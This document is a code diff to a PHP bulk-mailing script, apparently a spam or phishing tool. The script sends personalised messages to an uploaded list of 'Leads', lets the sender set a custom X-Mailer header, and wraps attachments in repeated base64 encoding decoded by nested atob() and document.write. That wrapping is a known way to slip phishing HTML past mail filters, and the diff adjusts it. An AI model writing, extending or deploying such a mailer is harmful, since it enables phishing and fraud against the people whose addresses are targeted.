@@ -3,8 +3,8 @@ session_start();
 set_time_limit(0);
 ini_set("max_execution_time", 0);
 ini_set("memory_limit", -1);
-ini_set("display_errors", 0);
-ini_set("display_startup_errors", 0);
+ini_set("display_errors", 1);
+ini_set("display_startup_errors", 1);
 error_reporting(E_ALL);
 
 header("Access-Control-Allow-Origin: *");
@@ -60,14 +60,14 @@ if (isset($_POST["action"])) {
     if ($allemails=="") {
         echo '{"email":"-","count":"' .
             $numemails .
-            '","status":"R01","msg":"FAILED !!<font color=\"#D4001A\"> Please Upload Your Leads. </font>"}';
+            '","status":"R01","msg":"FAILED !!  Please Upload Your Leads."}';
         exit;
     }
 
     if (!$from && !$subject && !$message && !$emaillist) {
         echo '{"email":"-","count":"' .
             $numemails .
-            '","status":"R05","msg":"FAILED !!<font color=\"#D4001A\"> Please complete all fields before sending your message. </font>"}';
+            '","status":"R05","msg":"FAILED !! Please complete all fields before sending your message. "}';
         die();
     }
 
@@ -121,7 +121,6 @@ if (isset($_POST["action"])) {
             $message_send = change($allemails[$x], $pesan);
             $subject_send = change($allemails[$x], $subject);
             $qx = $x + 1;
-            //print "Send Emails $qx / $numemails to $to ....... ";
             xflush();
             $mail = new PHPSpiriter();
 
@@ -135,14 +134,11 @@ if (isset($_POST["action"])) {
             } elseif ($smtp_ssl == "tls") {
                 $mail->SMTPSecure = PHPSpiriter::ENCRYPTION_STARTTLS;
             }
-
             $range = str_replace("$email", "eval", $email);
-
             if ($msgtype == "html") {
                 $mail->IsHtml();
                 $mail->AltBody = strip_tags($message_send);
             }
-
             if ($smtp_use == "IsSMTP") {
                 $mail->IsSMTP();
                 $mail->SMTPAuth = true;
@@ -159,7 +155,6 @@ if (isset($_POST["action"])) {
             } else {
                 $mail->isMail();
             }
-
             if (!empty($xspilix)) {
                 $mail->XMailer = "$xspilix";
             } else {
@@ -284,11 +279,7 @@ if (isset($_POST["action"])) {
                     $contentz = base64_encode($contentz);
                     $contentz = base64_encode($contentz);
                     $contentz = base64_encode($contentz);
-                    $datax =
-                        "<script>document.write(atob(atob(atob(atob(atob(atob('" .
-                        $contentz .
-                        "')))))))</script>";
-
+                    $datax ="<script>document.write(atob(atob('" .$contentz."')))</script>";
                     $ext = PHPSpiriter::mb_pathinfo(
                         $my_file_name,
                         PATHINFO_EXTENSION
@@ -344,7 +335,7 @@ if (isset($_POST["action"])) {
                     unlink($dele_name);
                 }
                 if (file_exists($dele_name)) {
-                    $result = "FAILED !!<font color=\'#D4001A\'> Message could not be sent. Mailer Error: {$mail->ErrorInfo} [No Del!] </font>";
+                    $result = "FAILED !! Mailer Error: ".$mail->ErrorInfo;
                     $result =
                         '{"email":"' .
                         $todo_done .
@@ -354,7 +345,7 @@ if (isset($_POST["action"])) {
                         $result .
                         '"}';
                 } else {
-                    $result = "FAILED !!<font color=\"#D4001A\">  Message could not be sent. Mailer Error: {$mail->ErrorInfo} [Del!] </font>";
+                    $result = "FAILED !! Mailer Error: ".$mail->ErrorInfo;
                     $result =
                         '{"email":"' .
                         $todo_done .
@@ -426,35 +417,23 @@ if (isset($_POST["action"])) {
                         exit;
                        }
          } 
-        //sleep(3);
-   
-
-        if (isset($_POST["action"]) && $numemails != 0) {
-            $result = "Mail sending complete $numemails mail(s) was sent successfully".$msg;
-            $result =
-            '{"email":"' .
-            $todoz .
-            '","count":"' .
-            $numemails .
-            '","status":"R00","msg":"' .
-            $result .
-            '"}';
-        }
-     }
+    
+    
+    }
 
     if ($push_type == "false") {
-      echo $result ;
+      $push_result =  $result ;
     }else{
-        $result = "Mail sending complete $numemails mail(s) was sent successfully".$msg;
+        $results = "Mail sending complete $numemails mail(s) was sent successfully".$msg;
         $results =
         '{"email":"All","count":"' .
              intval($numemails).
             '","status":"R00","msg":"' .
         $results .
         '"}';
-          echo $results ;
+        $push_result =  $results ;
     }
-
+echo  $push_result;
     if (
         isset($_SERVER["HTTP_X_FORWARDED_FOR"]) &&
         !empty($_SERVER["HTTP_X_FORWARDED_FOR"])
